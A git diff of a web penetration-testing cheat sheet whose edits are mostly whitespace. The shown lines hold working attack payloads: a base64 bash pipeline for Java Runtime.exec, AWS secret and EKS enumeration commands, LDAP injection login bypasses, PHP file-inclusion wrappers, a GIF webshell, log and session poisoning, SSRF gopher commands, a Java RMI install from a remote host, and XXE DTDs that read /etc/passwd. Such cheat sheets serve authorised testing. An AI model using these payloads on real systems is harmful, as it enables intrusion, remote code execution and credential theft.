@@ -366,8 +366,7 @@ Contet-Type: text/xml
   
 #### java.lang.Runtime.exec()
   
-bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}
-
+bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}  
 https://www.bugku.net/runtime-exec-payloads/
 
 #### Tools
@@ -440,13 +439,13 @@ http://<BUCKETNAME>.s3.amazonaws.com/
 or  
 http://s3.amazonaws.com/<BUCKETNAME>/  
 ```
-export AWS_ACCESS_KEY_ID=<access_key_id>  
+export AWS_ACCESS_KEY_ID=<access_key_id>   
 export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
-export AWS_SESSION_TOKEN=<session_token> 
+export AWS_SESSION_TOKEN=<session_token>  
 
-aws sts get-caller-identity
-aws iam get-user
-aws s3 ls s3://<bucket> --no-sign-request
+aws sts get-caller-identity  
+aws iam get-user  
+aws s3 ls s3://<bucket> --no-sign-request  
 aws ec2 describe-instances
 ```
 ```
@@ -457,19 +456,18 @@ aws ec2 describe-instances  --profile myprofile
 
 ```
 ```
-aws secretsmanager list-secrets --profile myprofile --region=us-est-1
-aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-est-1  
+aws secretsmanager list-secrets --profile myprofile --region=us-est-1  
+aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-est-1
 ```
 ### EKS
 
 ```
-aws eks list-clusters --region us-eas-1
-aws eks describe-cluster --name <name_cluster> --region us-eas-1
-aws eks update-kubeconfig --region us-east-1 --name <name_cluster>
-./kubectl get pods
-./kubectl describe pods <name_pods>
+aws eks list-clusters --region us-eas-1  
+aws eks describe-cluster --name <name_cluster> --region us-eas-1  
+aws eks update-kubeconfig --region us-east-1 --name <name_cluster>  
+./kubectl get pods  
+./kubectl describe pods <name_pods>  
 ./kubectl get pods --all-namespace
-
 ```
 ### Tools
 
@@ -495,7 +493,6 @@ https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/I
 ### LDAP Injection - Bypass Login
 
 ```$filter = "(&(uid=$username)(userPassword=$password))";```  
-
 `https://site.com/admin.php?username=*&password=*`  
 or  
 `https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla`  
@@ -509,8 +506,7 @@ or
 `nmap -p 389,636 --script ldap-* 192.168.191.132`  
 or  
 `ldapsearch -x -H ldap://ip -D "cn=<cn,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts`  
-`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>`
-
+`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>`  
 https://github.com/dinigalab/ldapsearch
 
 ### Docs
@@ -540,7 +536,7 @@ Vulnerability Forced OAuth profile linking
 ```
 <html>
 	<body>
-      	<form action="http://site.com/callback?code=<code>" method="GET">
+      		<form action="http://site.com/callback?code=<code>" method="GET">
 		</form> 
 	</body>
 	<script>
@@ -668,7 +664,7 @@ $language = str_replace('../', '', $_GET['file']);
 `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`  
 `expect://id`  
 `php://filter/read=convert.base64-encode/resource=index.php`  
-`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`  
+`php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
 
 #### Filter PHP
 
@@ -690,8 +686,8 @@ preg_match('/^\.\/okay\/.+$/', $_GET['file'])
 
 -> gif
 
-`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif'`    
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif
+`echo 'GIF8\<?php system($_GET["cmd"]); ?>' > ok.gif'`  
+https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
 
 -> Zip
 
@@ -732,7 +728,6 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 -> PHP session
 
 `http://ip/index.php?file= \<?php system($_GET["cmd"];?>`  
-  
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
@@ -935,10 +930,9 @@ gopher://127.0.0.1:port/_
 ### Scripts
 
 -> memcached.py  
-`stats items`    
+`stats items`  
 `stats cachedump <slab class> <number of items to dump>`  
-`get <item>`
-
+`get <item>`  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 
 
 -> zabbix.py  
@@ -951,13 +945,12 @@ https://github.com/tarunkant/Gopherus
   
 ### Docs for SSRF
 
-https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
-
+https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf  
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ## Insecure RMI
 -> Example:  
-Open port Java RMI 9991
+//Open port Java RMI 9991  
 `jython sjet.py 192.168.11.136 9991 password install http://192.168.11.132:8000 8000`  
 `jython sjet.py 192.168.11.136 9991 password command "ls -la"`  
 https://github.com/siberas/sjet  
@@ -965,7 +958,7 @@ http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.
 
 ## Null Origin Exploitation
 
--> Identify - Response 
+-> Identify - Response
 ```
 HTTP/1.1 200 OK  
 ...  
@@ -1071,7 +1064,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Retrieve data via error messages with dtd file
   
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd  
 
 -> Part 1 (Request Principal)
 ```
@@ -1087,7 +1080,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
-  ```
+```
   
 ### XInclude to retrieve files with dtd file
 
@@ -1214,7 +1207,6 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 #### Parameters Discovery
 
 `python paramspider.py -d stripe.com | uro | httpx -fc 404 | anew spider_parameters.txt`  
-
 `echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt`
 
 ### Other Steps
@@ -1255,8 +1247,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 3.2 -> paramspider + uro + httpx
 
-`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`
-
+`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`  
 `cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt`
 
 #### 4 - Files Discovery
